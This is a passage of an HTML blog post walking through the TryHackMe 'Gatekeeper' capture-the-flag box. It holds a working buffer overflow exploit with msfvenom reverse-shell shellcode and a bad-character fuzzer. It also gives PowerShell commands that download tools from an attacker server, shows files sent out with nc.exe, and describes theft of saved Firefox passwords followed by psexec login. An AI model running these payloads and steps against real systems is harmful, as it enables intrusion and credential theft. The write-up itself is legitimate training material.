+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-txt" data-lang="txt">0x080414c3 # jmp ESP
+0x080416bf # jmp ESP
+</code></pre></td></tr></table>
+</div>
+</div><p>This gives us the formula of: <code>&lt;146 characters&gt; + &lt;addr of jmp ESP&gt; + &lt;nop sled&gt; + &lt;shellcode&gt;</code>. The use of the nop sled, while strictly isn&rsquo;t necessary, does give a bit of wiggle room to make sure the <code>jmp esp</code> will lands where it needs to and always allow for successful execution of shellcode.</p>
+<p>Next up is generating the actual shellcode. This is where <code>msfvenom</code> comes into the picture. Since the aim of these is to gain more experience rooting boxes without <code>meterepter</code>, we&rsquo;ll just use a simple <code>shell_reverse_tcp</code>.</p>
+<p>There&rsquo;s one more thing to note here: <code>bad characters</code>. <code>bad characters</code> are those that cause our shellcode to become invalid, either because they cause the input to not be entirely consumed or are explicitly filtered out by the targeted application. A typical example of this is <code>\x00</code>, especially with string input as it&rsquo;s the <code>null terminator</code>. So before we can generate our final payload, some care will need to be taken to identify these bad characters.</p>
+<p>Queue <code>python</code>, we can generate a payload to send it to the server and work through eliminating characters that will mess up our shellcode.</p>
+<blockquote>
+<p>Quick note: I&rsquo;ll be using <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener noreffer">pwntools</a>, while it&rsquo;s not required, I like some of the functionality offered by it, especially the logging.</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">RHOST</span> <span class="o">=</span> <span class="s1">&#39;10.10.182.65&#39;</span>
+<span class="n">RPORT</span> <span class="o">=</span> <span class="mi">31337</span>
+
+<span class="n">BAD_CHARS</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="c1"># Loop over each characters</span>
+<span class="c1"># Build a string of &#34;AAAA&#34; + &#34;&lt;char&gt;&#34; + &#34;BBBB\r&#34;</span>
+<span class="c1"># Check the output for &#34;BBBB&#34;, if there&#39;s a bad character</span>
+<span class="c1"># The Bs should get dropped from the output</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
+    <span class="n">char_to_test</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;B&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;AAAA&#34;</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="n">char_to_test</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;BBBB</span><span class="se">\n</span><span class="s2">&#34;</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Testing: {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Connecting to host...&#34;</span><span class="p">)</span>
+        <span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">RPORT</span><span class="p">)</span>
+
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Sending payload... {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Recv-ing message back...&#34;</span><span class="p">)</span>
+        <span class="n">message</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Got: {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">message</span><span class="p">))</span>
+        <span class="n">test</span> <span class="o">=</span> <span class="n">char_to_test</span> <span class="o">+</span> <span class="s2">&#34;BBBB&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+        <span class="k">if</span> <span class="n">test</span> <span class="ow">in</span> <span class="n">message</span><span class="p">:</span>
+            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Char: {} is okay.&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">char_to_test</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">log</span><span class="o">.</span><span class="n">warn</span><span class="p">(</span><span class="s2">&#34;Char: {} is NOT good.&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">char_to_test</span><span class="p">))</span>
+            <span class="n">BAD_CHARS</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">x&#34;</span> <span class="o">+</span> <span class="n">char_to_test</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
+
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Something bad happened.&#34;</span><span class="p">)</span>
+
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Got these bad chars: {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">BAD_CHARS</span><span class="p">)))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>After letting this run for a bit, it prints out the following: <code>[*] Got these bad chars: \x00\x0a</code>. So, now that the <code>bad characters</code> have been identified, it&rsquo;s finally time to build the shellcode payload using <code>msfvenom</code>. Specially, we&rsquo;ll have <code>msfvenom</code> output some python to make copy and pasting a bit quicker, using the <code>shikata_ga_nai</code> encoder and filter out <code>\x00\x0a</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.13.1.151 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span> -e x86/shikata_ga_nai -f python -b <span class="s1">&#39;\x00\x0a&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>With the shellcode created, it&rsquo;s now time to craft our exploit for getting a shell, and ultimately our foothold on Gatekeeper:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">RHOST</span> <span class="o">=</span> <span class="s1">&#39;10.0.2.4&#39;</span>
+<span class="n">RPORT</span> <span class="o">=</span> <span class="mi">31337</span>
+
+<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+<span class="c1"># Init buffer to overflow with</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">146</span>
+
+<span class="c1"># Addr to replace our EIP - going to use a jmp esp</span>
+<span class="c1"># Using Immunity Debugger and `mona.py` it&#39;s possible to locate an aslr free addr</span>
+<span class="c1"># Two possible options:</span>
+<span class="c1">#      0x080414c3 jmp ESP</span>
+<span class="c1">#      0x080416bf jmp ESP</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc3\x14\x04\x08</span><span class="s2">&#34;</span>
+
+<span class="c1"># Nop sled</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">16</span>
+
+<span class="c1"># Shellcode</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbf\x2c\x2a\x90\xac\xd9\xea\xd9\x74\x24\xf4\x5a\x31</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x52\x31\x7a\x12\x83\xc2\x04\x03\x56\x24\x72</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x59\x5a\xd0\xf0\xa2\xa2\x21\x95\x2b\x47\x10\x95\x48</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0c\x03\x25\x1a\x40\xa8\xce\x4e\x70\x3b\xa2\x46\x77</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x8c\x09\xb1\xb6\x0d\x21\x81\xd9\x8d\x38\xd6\x39\xaf</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf2\x2b\x38\xe8\xef\xc6\x68\xa1\x64\x74\x9c\xc6\x31</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x45\x17\x94\xd4\xcd\xc4\x6d\xd6\xfc\x5b\xe5\x81\xde</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x5a\x2a\xba\x56\x44\x2f\x87\x21\xff\x9b\x73\xb0\x29</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd2\x7c\x1f\x14\xda\x8e\x61\x51\xdd\x70\x14\xab\x1d</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0c\x2f\x68\x5f\xca\xba\x6a\xc7\x99\x1d\x56\xf9\x4e</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xfb\x1d\xf5\x3b\x8f\x79\x1a\xbd\x5c\xf2\x26\x36\x63</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd4\xae\x0c\x40\xf0\xeb\xd7\xe9\xa1\x51\xb9\x16\xb1</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x39\x66\xb3\xba\xd4\x73\xce\xe1\xb0\xb0\xe3\x19\x41</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xdf\x74\x6a\x73\x40\x2f\xe4\x3f\x09\xe9\xf3\x40\x20</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x4d\x6b\xbf\xcb\xae\xa2\x04\x9f\xfe\xdc\xad\xa0\x94</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x1c\x51\x75\x3a\x4c\xfd\x26\xfb\x3c\xbd\x96\x93\x56</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x32\xc8\x84\x59\x98\x61\x2e\xa0\x4b\x84\xaf\xa8\x84</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf0\xad\xac\x8b\x5b\x3b\x4a\xc1\x4b\x6d\xc5\x7e\xf5</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x34\x9d\x1f\xfa\xe2\xd8\x20\x70\x01\x1d\xee\x71\x6c</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0d\x87\x71\x3b\x6f\x0e\x8d\x91\x07\xcc\x1c\x7e\xd7</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x9b\x3c\x29\x80\xcc\xf3\x20\x44\xe1\xaa\x9a\x7a\xf8</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x2b\xe4\x3e\x27\x88\xeb\xbf\xaa\xb4\xcf\xaf\x72\x34</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x54\x9b\x2a\x63\x02\x75\x8d\xdd\xe4\x2f\x47\xb1\xae</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa7\x1e\xf9\x70\xb1\x1e\xd4\x06\x5d\xae\x81\x5e\x62</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x1f\x46\x57\x1b\x7d\xf6\x98\xf6\xc5\x06\xd3\x5a\x6f</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x8f\xba\x0f\x2d\xd2\x3c\xfa\x72\xeb\xbe\x0e\x0b\x08</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xde\x7b\x0e\x54\x58\x90\x62\xc5\x0d\x96\xd1\xe6\x07</span><span class="s2">&#34;</span>
+
+<span class="c1"># Null terminator and newline</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x0a</span><span class="s1">&#39;</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Connecting to host...&#34;</span><span class="p">)</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">RPORT</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="o">.</span><span class="mo">05</span><span class="p">)</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Sending payload... {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Recv-ing message back...&#34;</span><span class="p">)</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Got: {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">banner</span><span class="p">))</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Start up a <code>nc</code> on the attacking machine, and then launch the exploit. Once the shell connects, it&rsquo;s time to figure out the next steps. I&rsquo;ll admit I&rsquo;m still fairly new to this world, but it seems like after a foothold has been established the next step is to gather information and look for any obvious ways of <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation" target="_blank" rel="noopener noreffer">PrivEsc</a>. So this is where <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener noreffer">WinPEAs</a> comes into the picture.</p>
+<p>On the attacking machine, fire up the <code>SimpleHTTPServer</code> (<code>python -m SimpleHTTPServer</code>) in a directory that has the <code>winPEAS.bat</code>. While we are at it, make sure <code>nc.exe</code> is also in that directory - keep in mind that in more &ldquo;realistic&rdquo; environments, <code>nc.exe</code> would likely set off some alarms.</p>
+<p>Now on the shell on the victim machine grab both using <code>powershell</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">powershell -c <span class="s2">&#34;Set-Content -value (New-Object Net.WebClient).DownloadData(&#39;http://10.13.1.151:8787/winPEAS.bat&#39;) -encoding byte -Path magic.bat&#34;</span><span class="p">;</span>
+powershell -c <span class="s2">&#34;Set-Content -value (New-Object Net.WebClient).DownloadData(&#39;http://10.13.1.151:8787/nc.exe&#39;) -encoding byte -Path nc.exe&#34;</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Also with that shell, in the current directory, the first flag can be found in <code>user.txt.txt</code>.</p>
+<p>Now it&rsquo;s time to kick off <code>winPEAs.bat</code> and see if there&rsquo;s something there to get us the privs needed to get to root flag. After letting <code>winPEAs</code> finish running it doesn&rsquo;t look like there&rsquo;s anything too obvious to use to escalate. So time to do some manual digging, the <code>C:\Users</code> folder does reveal that there are two accounts: <code>natbat</code>, and <code>mayor</code>. It looks like <code>mayor</code> is ultimately where we need to get to. Lastly, something else that caught my eye in the <code>natbat</code> user&rsquo;s directory a file named <code>Firefox.lnk</code>.</p>
+<p>Without anything obvious from <code>winPEAs</code>, checking <code>exploit-db</code> for every running process and service, digging through most of the readable contents on the machine and coming up with no clear way to make forward progress - I was at a bit of a loss as to what to do. I&rsquo;d love to be able to say the answer randomly came to me, or I had a random epiphany, however there was none of that. Instead I had to go looking for some hints in other guides - and that&rsquo;s when it became obvious as to what I had missed at the beginning. In fact, the inclusion of the <code>Firefox.lnk</code> was a hint as to where to go next. It turns out that browsers on machines are great resources for getting saved credentials and that it&rsquo;s fairly easy to do so.</p>
+<p>The trick here is to use <a href="https://github.com/unode/firefox_decrypt" target="_blank" rel="noopener noreffer">firefox_decrypt</a>. It allows for &ldquo;recovery&rdquo; of saved passwords. The goods in this particular case can be found in <code>C:\Users\natbat\AppData\Roaming\Mozilla\FireFox\Profiles\...</code>. Using <code>nc.exe</code>, I transferred the needed files over. On the attacking machine using <code>firefox_decrypt</code> was trivial, since there was no master password set:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">$ python firefox_decrypt/firefox_decrypt.py gatekeeper/
+2020-08-01 01:47:04,815 - WARNING - profile.ini not found in gatekeeper/
+2020-08-01 01:47:04,815 - WARNING - Continuing and assuming <span class="s1">&#39;gatekeeper/&#39;</span> is a profile location
+
+Master Password <span class="k">for</span> profile gatekeeper/:
+2020-08-01 01:47:15,801 - WARNING - Attempting decryption with no Master Password
+
+Website:   &lt;https://creds.com&gt;
+Username: <span class="s1">&#39;mayor&#39;</span>
+Password: <span class="s1">&#39;************&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>With the password, use <a href="https://www.secureauth.com/labs/open-source-tools/impacket" target="_blank" rel="noopener noreffer">impacket</a>&rsquo;s <code>psexec.py</code> to spawn a shell and grab the root flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">kali@kali:~/Desktop/pentest$ /usr/share/doc/python3-impacket/examples/psexec.py GATEKEEPER/mayor:**************@10.10.145.175
+
+C:<span class="se">\U</span>sers<span class="se">\m</span>ayor<span class="se">\D</span>esktop&gt;type root.txt.txt
+<span class="o">{</span>T**********************U<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This box was a bit of an eye opener since it never even occurred to me to look into the files from the Browsers - however now that I&rsquo;ve done so I&rsquo;ll be adding it to my list of things to check for in the future.</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-08-30&nbsp;<i class="fas fa-hashtag fa-fw"></i>76d7ab6</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://noopz.github.io/gatekeeper/" data-title="Try Hack Me - Gatekeeper Walkthrough" data-hashtags="tryhackme,hack,python,gatekeeper,bufferoverflow,bad characters"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://noopz.github.io/gatekeeper/" data-hashtag="tryhackme"><i class="fab fa-facebook-square fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/tryhackme/">tryhackme</a>,&nbsp;<a href="/tags/hack/">hack</a>,&nbsp;<a href="/tags/python/">python</a>,&nbsp;<a href="/tags/gatekeeper/">gatekeeper</a>,&nbsp;<a href="/tags/bufferoverflow/">bufferoverflow</a>,&nbsp;<a href="/tags/bad-characters/">bad characters</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/narnia_challenges_part6/" class="prev" rel="prev" title="Narnia Challenges (part 6)"><i class="fas fa-angle-left fa-fw"></i>Narnia Challenges (part 6)</a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Zack</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">cc by-nc 4.0</a></span><br><span class="asdf">&nbsp;<a href="/privacy" target="">Privacy Policy</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":300},"comment":{},"cookieconsent":{"content":{"allow":"Allow cookies","deny":"Decline","dismiss":"Allow cookies","link":"Learn more","message":"This website uses cookies to ensure you get the best experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"revokable":false,"theme":"edgeless","type":"info"},"gtagConfig":{"anonymize_ip":true,"enable":true,"tracking_id":"UA-168052344-1"}};</script><script type="text/javascript" src="/js/theme.min.cb3f77989212bebcd498d8b441c555574e00a1a1250508a430cf215c9f45bef736e721d5005ef144b47b2cd3997c2175c03977c50086fe4016eab32a8fe118b6.js" integrity="sha512-yz93mJISvrzUmNi0QcVVV04AoaElBQikMM8hXJ9Fvvc25yHVAF7xRLR7LNOZfCF1wDl3xQCG/kAW6rMqj&#43;EYtg=="></script>
+</body>
+</html>
